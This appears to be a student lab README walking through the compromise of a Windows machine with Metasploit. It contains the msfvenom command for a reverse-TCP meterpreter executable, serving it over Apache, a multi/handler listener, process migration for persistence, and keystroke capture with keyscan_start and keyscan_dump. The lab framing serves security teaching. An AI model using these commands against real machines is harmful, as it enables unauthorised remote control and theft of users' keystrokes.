# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:

![Screenshot 2024-04-27 225958](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/4f2f69c1-b13b-46d1-9606-88d9dd94ff1c)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![Screenshot 2024-04-27 230125](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/00c06398-5fc2-45e5-8d37-930015471760)

copy the fun.exe into the apache /var/www/html folder

![Screenshot 2024-04-27 230222](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/200832f8-179c-4755-98dc-556e43ea369d)

Start apache server sudo systemctl apache2 start

![Screenshot 2024-04-27 230325](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/5688706c-7032-48f8-a69a-706710b22494)

Check the status of apache2

![Screenshot 2024-04-27 230353](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/70e79ec5-be33-45d6-9b52-22ddcfe6cbcc)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![Screenshot 2024-04-27 230538](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/9e242c40-3eb1-4bd2-83dc-78e0188b544b)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![Screenshot 2024-04-27 230606](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/a0a99630-57d8-45ec-8c1e-e49fe63780e1)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![Screenshot 2024-04-27 230745](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/dba3c593-d134-4154-a2c9-0d9a2bfaf7f2)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![Screenshot 2024-04-27 230906](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/c8f21288-a15b-4b27-bf02-f65e6eb9dd71)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![Screenshot 2024-04-27 230951](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/74e7a655-4097-4c59-ad23-acc7e3eff712)

keyscan_dump Shows the keystrokes captured so far

![Screenshot 2024-04-27 231001](https://github.com/sathyaa22/Compromising-windows-using-Metasploit/assets/140483368/22256fb8-f1a1-4648-ab81-80b8ac442359)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
